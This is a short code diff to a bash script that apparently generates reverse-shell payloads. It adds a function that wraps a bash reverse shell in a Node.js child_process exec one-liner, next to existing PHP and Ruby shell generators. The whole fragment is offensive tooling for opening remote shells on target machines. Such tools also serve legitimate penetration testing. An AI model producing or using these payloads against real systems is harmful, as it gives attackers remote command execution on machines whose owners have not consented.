@@ -110,6 +110,16 @@ get_php_reverse_shell() {
 
 }
 
+get_nodejs_reverse_shell() {
+    prepare_generic_linux_shell
+    if [[ -z $cmd ]]; then
+        cmd=$(get_bash_reverse_shell)
+    fi
+    local reverse_shell="require(\"child_process\").exec(\"$cmd\")"
+
+    echo "$reverse_shell"
+}
+
 get_ruby_reverse_shell() {
     prepare_generic_linux_shell
     if [[ -z $target_arch ]]; then
